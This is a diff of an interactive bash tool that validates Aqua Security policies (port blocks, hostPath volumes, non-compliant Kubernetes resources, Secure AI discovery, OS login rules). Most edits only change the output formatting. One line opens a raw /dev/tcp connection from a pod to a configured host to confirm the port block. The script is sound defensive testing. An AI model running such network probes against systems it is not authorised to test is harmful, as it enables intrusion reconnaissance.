                 kubectl exec -n "$AQUA_PROBE_TEST_NAMESPACE" -it $pod_name --container $container_name -- bash -c "timeout 5 bash -c 'echo >/dev/tcp/$port_block_host/$port_block_port'"
                 echo
-                print_colored_message yellow "[!] Observe that an error code or kill signal was returned because the destination port has been blocked by Aqua."
+                print_instructions "Observe that an error code or kill signal was returned because the destination port has been blocked by Aqua." "CHECK THE RESULT" teal
                 echo
                 print_audit_review
             else
@@ -1612,10 +1639,10 @@ test_port_block() {
             fi
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1657,7 +1684,7 @@ test_volumes_blocked() {
 
             echo
             volume_test_image=$(prompt_for_test_image "Enter image to deploy for the Volumes Blocked test")
-            print_colored_message yellow "Deploying volume block test pod with image '$volume_test_image' and hostPath '$blocked_host_path' mounted at '$blocked_mount_path'..."
+            print_step "Deploying volume block test pod with image '$volume_test_image' and hostPath '$blocked_host_path' mounted at '$blocked_mount_path'..."
             echo
             ensure_test_namespace
             kubectl delete pod volume-block-test -n "$AQUA_PROBE_TEST_NAMESPACE" --ignore-not-found
@@ -1685,15 +1712,15 @@ EOF
             echo
             echo "Verify: kubectl get pod volume-block-test -n $AQUA_PROBE_TEST_NAMESPACE -o yaml | grep -A5 hostPath"
             echo
-            print_colored_message yellow "[!] Observe that the pod creation is blocked because it requests a blocked hostPath volume."
+            print_instructions "Observe that the pod creation is blocked because it requests a blocked hostPath volume." "CHECK THE RESULT" teal
             echo
             print_audit_review
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -1724,7 +1751,7 @@ test_block_non_compliant_resources() {
         [Yy]*)
             echo
             non_compliant_resource_image=$(prompt_for_test_image "Enter image to deploy for the non-compliant resource tests")
-            print_colored_message yellow "Applying non-compliant Kubernetes resource examples with image: $non_compliant_resource_image"
+            print_step "Applying non-compliant Kubernetes resource examples with image: $non_compliant_resource_image"
             echo
             kubectl create namespace $lab_namespace --dry-run=client -o yaml | kubectl apply -f -
             apply_non_compliant_resource "host-ipc-bad" <<EOF
@@ -2392,17 +2419,17 @@ spec:
       path: /var/log
 EOF
             echo
-            print_colored_message yellow "[!] Observe that non-compliant resource creation is blocked or reported by Aqua."
+            print_instructions "Observe that non-compliant resource creation is blocked or reported by Aqua." "CHECK THE RESULT" teal
             echo
             print_audit_review
             echo
             print_colored_message yellow "Cleanup runs automatically when you select the Terminate Program option."
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -2445,7 +2472,7 @@ test_secure_ai_discovery() {
 
             ensure_test_namespace
             echo
-            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
+            print_step "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
             kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Secret
@@ -2458,7 +2485,7 @@ EOF
             unset openai_api_key_b64
 
             echo
-            print_colored_message yellow "Deploying Secure AI - Discovery sample app with image: ericgomes56/ai-app:1.0"
+            print_step "Deploying Secure AI - Discovery sample app with image: ericgomes56/ai-app:1.0"
             kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
@@ -2503,10 +2530,10 @@ spec:
       targetPort: 8501
 EOF
             echo
-            print_colored_message yellow "Waiting for Secure AI - Discovery deployment rollout..."
+            print_step "Waiting for Secure AI - Discovery deployment rollout..."
             kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
             echo
-            print_colored_message yellow "Waiting for LoadBalancer URL..."
+            print_step "Waiting for LoadBalancer URL..."
             for i in {1..36}; do
                 ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                 ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)
@@ -2525,26 +2552,26 @@ EOF
             if [ -n "$ai_app_url" ]; then
                 print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                 echo
-                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
+                print_instructions "Open the URL above using HTTP and port 8501." "CHECK THE RESULT" teal
             else
                 print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                 echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
             fi
             echo
-            print_colored_message yellow "[!] In the app, click Request Simulator in the bottom-right corner, click OpenAI, and send the request."
+            print_instructions "In the app, click Request Simulator in the bottom-right corner, click OpenAI, and send the request." "CHECK THE RESULT" teal
             echo
-            print_colored_message yellow "[!] Notice that AI Findings populates in Aqua and an audit event is generated."
+            print_instructions "Notice that AI Findings populates in Aqua and an audit event is generated." "CHECK THE RESULT" teal
             echo
-            print_colored_message yellow "[!] Observe that the AI application is discovered by Aqua Secure AI controls."
+            print_instructions "Observe that the AI application is discovered by Aqua Secure AI controls." "CHECK THE RESULT" teal
             echo
             print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI discovery findings for the deployed AI application."
             unset ai_lb_hostname ai_lb_ip ai_app_url
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -2590,7 +2617,7 @@ test_secure_ai_unauthorized_models() {
 
             ensure_test_namespace
             echo
-            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
+            print_step "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
             kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Secret
@@ -2613,7 +2640,7 @@ EOF
 
             if [ "$ai_app_exists" != "true" ]; then
                 echo
-                print_colored_message yellow "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
+                print_step "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
                 kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
@@ -2675,10 +2702,10 @@ EOF
             fi
 
             echo
-            print_colored_message yellow "Waiting for Secure AI deployment rollout..."
+            print_step "Waiting for Secure AI deployment rollout..."
             kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
             echo
-            print_colored_message yellow "Waiting for LoadBalancer URL..."
+            print_step "Waiting for LoadBalancer URL..."
             for i in {1..36}; do
                 ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                 ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)
@@ -2697,24 +2724,24 @@ EOF
             if [ -n "$ai_app_url" ]; then
                 print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                 echo
-                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
+                print_instructions "Open the URL above using HTTP and port 8501." "CHECK THE RESULT" teal
             else
                 print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                 echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
             fi
             echo
-            print_colored_message yellow "[!] In the app, click Request Simulator in the bottom-right corner, click OpenAI, choose model override type 'gpt-4', and send the request."
+            print_instructions "In the app, click Request Simulator in the bottom-right corner, click OpenAI, choose model override type 'gpt-4', and send the request." "CHECK THE RESULT" teal
             echo
-            print_colored_message yellow "[!] Notice that AI Findings populates in Aqua and an audit event is generated for the unauthorized model request."
+            print_instructions "Notice that AI Findings populates in Aqua and an audit event is generated for the unauthorized model request." "CHECK THE RESULT" teal
             echo
             print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI findings and audit events for OpenAI@gpt-4."
             unset ai_lb_hostname ai_lb_ip ai_app_url ai_app_exists
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -2759,7 +2786,7 @@ test_secure_ai_protection() {
 
             ensure_test_namespace
             echo
-            print_colored_message yellow "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
+            print_step "Creating Kubernetes secret '$openai_secret_name' in namespace '$AQUA_PROBE_TEST_NAMESPACE'..."
             kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: v1
 kind: Secret
@@ -2782,7 +2809,7 @@ EOF
 
             if [ "$ai_app_exists" != "true" ]; then
                 echo
-                print_colored_message yellow "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
+                print_step "Deploying Secure AI sample app with image: ericgomes56/ai-app:1.0"
                 kubectl apply -n "$AQUA_PROBE_TEST_NAMESPACE" -f - <<EOF
 apiVersion: apps/v1
 kind: Deployment
@@ -2844,10 +2871,10 @@ EOF
             fi
 
             echo
-            print_colored_message yellow "Waiting for Secure AI deployment rollout..."
+            print_step "Waiting for Secure AI deployment rollout..."
             kubectl rollout status deployment/$ai_app_name -n "$AQUA_PROBE_TEST_NAMESPACE" --timeout=120s
             echo
-            print_colored_message yellow "Waiting for LoadBalancer URL..."
+            print_step "Waiting for LoadBalancer URL..."
             for i in {1..36}; do
                 ai_lb_hostname=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].hostname}' 2>/dev/null)
                 ai_lb_ip=$(kubectl get service "$ai_service_name" -n "$AQUA_PROBE_TEST_NAMESPACE" -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null)
@@ -2866,24 +2893,24 @@ EOF
             if [ -n "$ai_app_url" ]; then
                 print_colored_message green "[✓] Secure AI app URL: $ai_app_url"
                 echo
-                print_colored_message yellow "[!] Open the URL above using HTTP and port 8501."
+                print_instructions "Open the URL above using HTTP and port 8501." "CHECK THE RESULT" teal
             else
                 print_colored_message yellow "[!] LoadBalancer URL is still pending. Run the following command and open the EXTERNAL-IP or hostname using HTTP on port 8501:"
                 echo "kubectl get service $ai_service_name -n $AQUA_PROBE_TEST_NAMESPACE"
             fi
             echo
-            print_colored_message yellow "[!] In the app, click Attack Library in the bottom-right corner and choose any one of the examples there."
+            print_instructions "In the app, click Attack Library in the bottom-right corner and choose any one of the examples there." "CHECK THE RESULT" teal
             echo
-            print_colored_message yellow "[!] Notice that Secure AI Protection evaluates the prompt and related AI Findings and audit events are generated in Aqua."
+            print_instructions "Notice that Secure AI Protection evaluates the prompt and related AI Findings and audit events are generated in Aqua." "CHECK THE RESULT" teal
             echo
             print_colored_message green "[✓] Please login to the Aqua Console and review Secure AI findings and audit events for the protection test."
             unset ai_lb_hostname ai_lb_ip ai_app_url ai_app_exists
             ;;
         [Nn]*)
-            echo "Please ensure the prerequisites are met before proceeding."
+            print_colored_message yellow "Please ensure the prerequisites are met before proceeding."
             ;;
         *)
-            echo "Invalid input. Please enter 'y' for yes or 'n' for no."
+            print_colored_message red "Invalid input. Please enter 'y' for yes or 'n' for no."
             ;;
     esac
 }
@@ -3145,11 +3172,7 @@ host_ssh() {
 }
 
 print_support_detail() {
-    local tone="$1" text="$2" width line
-    width=$(instruction_width)
-    while IFS= read -r line; do
-        print_colored_message "$tone" "  $line"
-    done < <(printf '%s\n' "$text" | fold -s -w "$((width - 4))")
+    print_wrapped_text "$1" "$2"
 }
 
 print_host_os_requirements() {
@@ -3238,7 +3261,8 @@ review_host_control() {
 
 run_host_command() {
     local status=0
-    print_colored_message blue "$1"
+    print_wrapped_text blue 'COMMAND'
+    printf '%s\n' "$1"
     host_ssh "$1" </dev/null || status=$?
     print_colored_message text "Remote exit status: $status"
     review_host_control
@@ -3503,7 +3527,7 @@ After testing, remove ONLY this disposable path from protection so cleanup can s
     if [[ "$proceed" == yes ]]; then
         for phase in create read modify attributes delete; do
             if [[ "$mode" == Protection && ( "$phase" == read || "$phase" == attributes ) ]]; then continue; fi
-            print_colored_message blue "Windows registry operation: $phase"
+            print_step "Windows registry operation: $phase"
             script=$(windows_registry_script "$phase") || return 1
             status=0
             windows_powershell "$script" || status=$?
@@ -3591,7 +3615,7 @@ Check OS/account lockout rules. Do not modify production access policies. The sc
     print_instructions 'Before applying the test restriction, verify this account can authenticate. SSH will prompt for a valid password or key passphrase if required; Aqua Probe does not collect or store it.'
     read -r -p "$(format_prompt 'Recovery access verified and baseline login authorized? Type yes: ')" proceed || return 1
     [[ "$proceed" == yes ]] || return 0
-    print_colored_message blue 'BASELINE | Authenticating with valid credentials'
+    print_step 'BASELINE | Authenticating with valid credentials'
     if host_os_identity_probe "$platform" "$host" "$user" "$port" "$key"; then
         print_colored_message teal 'Baseline login and identity command succeeded.'
     else
@@ -3600,26 +3624,26 @@ Check OS/account lockout rules. Do not modify production access policies. The sc
     fi
     if [[ "$mode" == Allowed ]]; then
         if [[ "$expected" == allow ]]; then
-            print_instructions "In OS Users and Groups Allowed, add the test user to Users Allowed OR its selected group to Groups Allowed. For a group test, use Groups Allowed and avoid a direct user entry masking the group rule. Preserve recovery identities."
+            print_instructions "In OS Users and Groups Allowed, add the test user to Users Allowed OR its selected group to Groups Allowed. For a group test, use Groups Allowed and avoid a direct user entry masking the group rule. Preserve recovery identities." 'POLICY SETUP' blue
         else
-            print_instructions "In OS Users and Groups Allowed, preserve recovery identities but exclude the test user from Users Allowed AND every group it belongs to from Groups Allowed. For a group test, verify membership in '$group' and ensure no other membership grants access."
+            print_instructions "In OS Users and Groups Allowed, preserve recovery identities but exclude the test user from Users Allowed AND every group it belongs to from Groups Allowed. For a group test, verify membership in '$group' and ensure no other membership grants access." 'POLICY SETUP' blue
         fi
     else
         if [[ "$expected" == deny ]]; then
             if [[ "$subject" == user ]]; then
-                print_instructions "In OS Users and Groups Blocked, add '$user' to Users Blocked. Keep Groups Blocked from masking this user rule. Never block recovery identities."
+                print_instructions "In OS Users and Groups Blocked, add '$user' to Users Blocked. Keep Groups Blocked from masking this user rule. Never block recovery identities." 'POLICY SETUP' blue
             else
-                print_instructions "In OS Users and Groups Blocked, add '$group' to Groups Blocked without a direct user block masking the group rule. Never block recovery users or their groups."
+                print_instructions "In OS Users and Groups Blocked, add '$group' to Groups Blocked without a direct user block masking the group rule. Never block recovery users or their groups." 'POLICY SETUP' blue
             fi
         else
-            print_instructions 'In OS Users and Groups Blocked, exclude the test user from Users Blocked AND all of its groups from Groups Blocked. Keep unrelated allowlist controls from denying access.'
+            print_instructions 'In OS Users and Groups Blocked, exclude the test user from Users Blocked AND all of its groups from Groups Blocked. Keep unrelated allowlist controls from denying access.' 'POLICY SETUP' blue
         fi
     fi
     print_instructions 'Review the baseline identity/group output before changing policy. For group tests the test account must actually belong to the named Linux group or Windows AD group; typing a name here does not change membership.
 Apply the Host Runtime Policy in Enforce mode to this host, save it, and wait for Enforcer sync. Keep the other OS Users and Groups control from masking this test. Windows testing requires Windows Aqua Enforcer and Windows OpenSSH; this workflow does not validate RDP or interactive console authentication.'
     read -r -p "$(format_prompt 'Membership verified, policy synced, recovery retained; run one new login? Type yes: ')" proceed || proceed=no
     if [[ "$proceed" == yes ]]; then
-        print_colored_message blue 'VALIDATION | Fresh SSH authentication'
+        print_step 'VALIDATION | Fresh SSH authentication'
         status=0
         host_os_identity_probe "$platform" "$host" "$user" "$port" "$key" || status=$?
         print_colored_message text "Expected: $expected | SSH/identity command exit status: $status"
